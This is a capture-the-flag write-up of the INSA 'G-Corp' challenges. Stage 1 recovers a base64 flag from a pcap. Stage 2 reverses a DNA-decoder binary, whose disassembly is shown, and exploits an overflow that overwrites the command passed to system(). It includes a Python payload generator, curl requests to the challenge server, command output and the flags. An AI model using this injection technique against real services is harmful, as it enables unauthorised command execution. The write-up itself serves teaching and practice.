## G-Corp 1 and 2

### [~$ cd ..](../)

### Step 1

We are given a [pcap file](exfil.pcap) with a single TCP stream. Actually, execute `strings` was sufficient to solve this first challenge, but not sufficient
to continue with the second part.

By dumping the content of the stream (Follow > TCP Stream > Save as), we got 2 files (thank you binwalk), one picture (useless) and a binary.

At the end of the payload, we found a base64-encoded string: 

SU5TQXtjMTgwN2EwYjZkNzcxMzI3NGQ3YmYzYzY0Nzc1NjJhYzQ3NTcwZTQ1MmY3N2I3ZDIwMmI4MWUxNDkxNzJkNmE3fQ==

which stands for:

**INSA{c1807a0b6d7713274d7bf3c6477562ac47570e452f77b7d202b81e149172d6a7}**

### Step 2 

(This challenge was clearly my favourite.)

The statement gives us an URL: https://gcorp-stage-2.ctf.insecurity-insa.fr:

> ```
>
>                        G-Corp DNA Decoder
>
>    -._    _.--'"`'--._    _.--'"`'--._    _.--'"`'--._    _
>        '-:`.'|`|"':-.  '-:`.'|`|"':-.  '-:`.'|`|"':-.  '.` : '.
>      '.  '.  | |  | |'.  '.  | |  | |'.  '.  | |  | |'.  '.:   '.  '.
>      : '.  '.| |  | |  '.  '.| |  | |  '.  '.| |  | |  '.  '.  : '.  `.
>      '   '.  `.:_ | :_.' '.  `.:_ | :_.' '.  `.:_ | :_.' '.  `.'   `.
>             `-..,..-'       `-..,..-'       `-..,..-'       `         `
>
>POST valid DNA data (input limited to 1024 bytes).
> ```

In order to know which kind of data we should send, we had to reverse the binary.

The program translates DNA data, represented by a string with 'A','C','T', and 'G', into binary. The program is vulnerable to buffer overflows,
but the goal is not to smash a return address. Actually, the program normally executes the routine `system` with an hardcoded argument.
However, if our string is too long, the translated binary string will overwrite the command. Sending some 'A's, 'C's, 'T's or 'G's in a particular
order could form an ASCII string, passed as parameter to `system`...

The first found that we need to send 1024 useless bytes (128 * 'ACTG' in our payload), and well chosen 4-bytes blocks translated into valid bash command.  
The most important routine in the binary is `d2b`, which translates our DNA-string into binary. Reverse the code is pretty straightforward.

> ```
Dump of assembler code for function d2b:
   0x00000000000007fa <+0>:	push   rbp
   0x00000000000007fb <+1>:	mov    rbp,rsp
   0x00000000000007fe <+4>:	sub    rsp,0x20
   0x0000000000000802 <+8>:	mov    QWORD PTR [rbp-0x18],rdi
   0x0000000000000806 <+12>:	mov    QWORD PTR [rbp-0x20],rsi
   0x000000000000080a <+16>:	mov    BYTE PTR [rbp-0x5],0x0
   0x000000000000080e <+20>:	mov    DWORD PTR [rbp-0x4],0x0
   0x0000000000000815 <+27>:	jmp    0x8e6 <d2b+236>
   0x000000000000081a <+32>:	mov    eax,DWORD PTR [rbp-0x4]
   0x000000000000081d <+35>:	movsxd rdx,eax
   0x0000000000000820 <+38>:	mov    rax,QWORD PTR [rbp-0x18]
   0x0000000000000824 <+42>:	add    rax,rdx
   0x0000000000000827 <+45>:	movzx  eax,BYTE PTR [rax]
   0x000000000000082a <+48>:	movsx  eax,al
   0x000000000000082d <+51>:	cmp    eax,0x43
   0x0000000000000830 <+54>:	je     0x84e <d2b+84>
   0x0000000000000832 <+56>:	cmp    eax,0x43
   0x0000000000000835 <+59>:	jg     0x842 <d2b+72>
   0x0000000000000837 <+61>:	cmp    eax,0x41
   0x000000000000083a <+64>:	je     0x8e1 <d2b+231>
   0x0000000000000840 <+70>:	jmp    0x8b4 <d2b+186>
   0x0000000000000842 <+72>:	cmp    eax,0x47
   0x0000000000000845 <+75>:	je     0x870 <d2b+118>
   0x0000000000000847 <+77>:	cmp    eax,0x54
   0x000000000000084a <+80>:	je     0x892 <d2b+152>
   0x000000000000084c <+82>:	jmp    0x8b4 <d2b+186>
   0x000000000000084e <+84>:	mov    eax,0x3
   0x0000000000000853 <+89>:	sub    eax,DWORD PTR [rbp-0x4]
   0x0000000000000856 <+92>:	add    eax,eax
   0x0000000000000858 <+94>:	mov    edx,0x1
   0x000000000000085d <+99>:	mov    ecx,eax
   0x000000000000085f <+101>:	shl    edx,cl
   0x0000000000000861 <+103>:	mov    eax,edx
   0x0000000000000863 <+105>:	mov    edx,eax
   0x0000000000000865 <+107>:	movzx  eax,BYTE PTR [rbp-0x5]
   0x0000000000000869 <+111>:	or     eax,edx
   0x000000000000086b <+113>:	mov    BYTE PTR [rbp-0x5],al
   0x000000000000086e <+116>:	jmp    0x8e2 <d2b+232>
   0x0000000000000870 <+118>:	mov    eax,0x3
   0x0000000000000875 <+123>:	sub    eax,DWORD PTR [rbp-0x4]
   0x0000000000000878 <+126>:	add    eax,eax
   0x000000000000087a <+128>:	mov    edx,0x2
   0x000000000000087f <+133>:	mov    ecx,eax
   0x0000000000000881 <+135>:	shl    edx,cl
   0x0000000000000883 <+137>:	mov    eax,edx
   0x0000000000000885 <+139>:	mov    edx,eax
   0x0000000000000887 <+141>:	movzx  eax,BYTE PTR [rbp-0x5]
   0x000000000000088b <+145>:	or     eax,edx
   0x000000000000088d <+147>:	mov    BYTE PTR [rbp-0x5],al
   0x0000000000000890 <+150>:	jmp    0x8e2 <d2b+232>
   0x0000000000000892 <+152>:	mov    eax,0x3
   0x0000000000000897 <+157>:	sub    eax,DWORD PTR [rbp-0x4]
   0x000000000000089a <+160>:	add    eax,eax
   0x000000000000089c <+162>:	mov    edx,0x3
   0x00000000000008a1 <+167>:	mov    ecx,eax
   0x00000000000008a3 <+169>:	shl    edx,cl
   0x00000000000008a5 <+171>:	mov    eax,edx
   0x00000000000008a7 <+173>:	mov    edx,eax
   0x00000000000008a9 <+175>:	movzx  eax,BYTE PTR [rbp-0x5]
   0x00000000000008ad <+179>:	or     eax,edx
   0x00000000000008af <+181>:	mov    BYTE PTR [rbp-0x5],al
   0x00000000000008b2 <+184>:	jmp    0x8e2 <d2b+232>
   0x00000000000008b4 <+186>:	mov    eax,DWORD PTR [rbp-0x4]
   0x00000000000008b7 <+189>:	movsxd rdx,eax
   0x00000000000008ba <+192>:	mov    rax,QWORD PTR [rbp-0x18]
   0x00000000000008be <+196>:	add    rax,rdx
   0x00000000000008c1 <+199>:	movzx  eax,BYTE PTR [rax]
   0x00000000000008c4 <+202>:	movsx  eax,al
   0x00000000000008c7 <+205>:	mov    esi,eax
   0x00000000000008c9 <+207>:	lea    rdi,[rip+0x268]        # 0xb38
   0x00000000000008d0 <+214>:	mov    eax,0x0
   0x00000000000008d5 <+219>:	call   0x6a0 <printf@plt>
   0x00000000000008da <+224>:	mov    eax,0xffffffff
   0x00000000000008df <+229>:	jmp    0x8ff <d2b+261>
   0x00000000000008e1 <+231>:	nop
   0x00000000000008e2 <+232>:	add    DWORD PTR [rbp-0x4],0x1
   0x00000000000008e6 <+236>:	cmp    DWORD PTR [rbp-0x4],0x3
   0x00000000000008ea <+240>:	jle    0x81a <d2b+32>
   0x00000000000008f0 <+246>:	mov    rax,QWORD PTR [rbp-0x20]
   0x00000000000008f4 <+250>:	movzx  edx,BYTE PTR [rbp-0x5]
   0x00000000000008f8 <+254>:	mov    BYTE PTR [rax],dl
   0x00000000000008fa <+256>:	mov    eax,0x0
   0x00000000000008ff <+261>:	leave  
   0x0000000000000900 <+262>:	ret    
End of assembler dump.
> ```

It's a 'for' loop, checking if each character is appropriate, and building the new binary string. The character 'A' is ignored (line <+64>),
otherwise, a shift-to-left is done. 

We then wrote a small [Python script](dna.py) to create our payload:

> ```python
>import itertools
>import sys
>
>cmd = sys.argv[1]
>for string in itertools.product('ACTG', repeat=4):
>	x = ''.join(y for y in string)
>	res = 0x0
>	for i in range(len(x)):
>		y = ord(x[i])
>		if y != 0x41:
>			z = 2*(3-i)
>			if y == 0x43:
>				y = 1 << z
>			elif y == 0x47:
>				y = 2 << z
>			elif y == 0x54:
>				y = 3 << z
>			res = (y|res) & 0xff
<	if chr(res) in sys.argv[1]:
>		cmd = cmd.replace(chr(res),x)
>print 'ACTG' * 128 + cmd
> ```

We first tried to execute 'cat flag.txt' but it didn't work:

> ```bash
> ~$ python dna.py 'cat flag.txt;'
> 	ACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGCGATCGACCTCAAGAACGCGCGTACGACCGCTAGTGCTCACTGACTCAATGT
> curl --data 'ACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGCGATCGACCTCAAGAACGCGCGTACGACCGCTAGTGCTCACTGACTCAATGT' https://gcorp-stage-2.ctf.insecurity-insa.fr/
> ```

Okay, let's retry with 'ls -a;'

> ```bash
> ~$ python dna.py 'ls -a;'       
>	ACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGCGTACTATAGAAAGTCCGACATGT
> ~$ curl --data 'ACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGCGTACTATAGAAAGTCCGACATGT' https://gcorp-stage-2.ctf.insecurity-insa.fr/
> 	.
>	..
>	.flag.txt
>	dna_decoder
>	stage_3_storage.zip
> ```

We first downloaded the zip for the next step, and read the flag:

> ```bash
> ~$ python dna.py 'cat .flag.txt;'
>	ACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGCGATCGACCTCAAGAAAGTGCGCGCGTACGACCGCTAGTGCTCACTGACTCAATGT
> ~$ curl --data ACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGACTGCGATCGACCTCAAGAAAGTGCGCGCGTACGACCGCTAGTGCTCACTGACTCAATGT https://gcorp-stage-2.ctf.insecurity-insa.fr/
> 	INSA{1fb977db25976d7e1a0fb713383de1cea90b2d15b4173708d867be3793571ed9} ...
> ```

